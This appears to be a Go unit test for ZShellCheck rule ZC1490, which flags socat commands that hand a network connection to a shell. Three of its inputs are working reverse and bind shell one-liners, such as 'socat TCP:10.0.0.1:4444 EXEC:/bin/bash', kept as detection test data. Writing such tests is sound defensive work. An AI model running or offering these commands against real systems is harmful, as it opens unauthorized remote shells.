// SPDX-License-Identifier: MIT
// Copyright the ZShellCheck contributors.
package katas

import (
	"testing"

	"github.com/afadesigns/zshellcheck/pkg/katas"
	"github.com/afadesigns/zshellcheck/pkg/testutil"
)

func TestZC1490(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — socat - TCP:host:port",
			input:    `socat - TCP:example.com:443`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — socat with EXEC:custom-tool",
			input:    `socat TCP-LISTEN:8080,fork EXEC:/usr/local/bin/backend`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — socat TCP:... EXEC:/bin/bash",
			input: `socat TCP:10.0.0.1:4444 EXEC:/bin/bash`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — socat TCP-LISTEN:... EXEC:\"/bin/sh -i\"",
			input: `socat TCP-LISTEN:4444 EXEC:"/bin/sh -i",pty,stderr`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — socat SYSTEM:/bin/sh",
			input: `socat tcp:host:port SYSTEM:/bin/sh`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1490")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}
